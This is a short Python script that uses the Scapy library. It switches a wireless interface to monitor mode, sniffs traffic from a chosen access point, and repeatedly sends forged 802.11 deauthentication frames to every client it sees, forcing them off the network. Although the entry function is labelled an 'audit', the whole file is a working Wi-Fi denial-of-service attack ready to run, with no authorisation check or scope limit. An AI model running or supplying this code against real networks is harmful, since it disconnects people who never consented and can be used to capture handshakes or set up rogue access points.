import time
from scapy.all import *

target_network = "TargetNetwork"
target_bssid = "00:11:22:33:44:55"  # Replace with the BSSID of the target network

def deauth_attack(pkt):
    if pkt.haslayer(Dot11):
        if pkt.addr2 == target_bssid:
            print("Deauthenticating client: ", pkt.addr1)
            deauth_pkt = Dot11(addr1=pkt.addr1, addr2=pkt.addr2, addr3=pkt.addr3) / Dot11Deauth(reason=7)
            send(deauth_pkt, inter=0.1, count=10)

def start_wifi_audit():
    # Set up the Wi-Fi interface in monitor mode
    os.system("ifconfig wlan0 down")
    os.system("iwconfig wlan0 mode monitor")
    os.system("ifconfig wlan0 up")

    # Start sniffing Wi-Fi packets and perform deauthentication attacks
    sniff(iface="wlan0", prn=deauth_attack)

if __name__ == "__main__":
    start_wifi_audit()
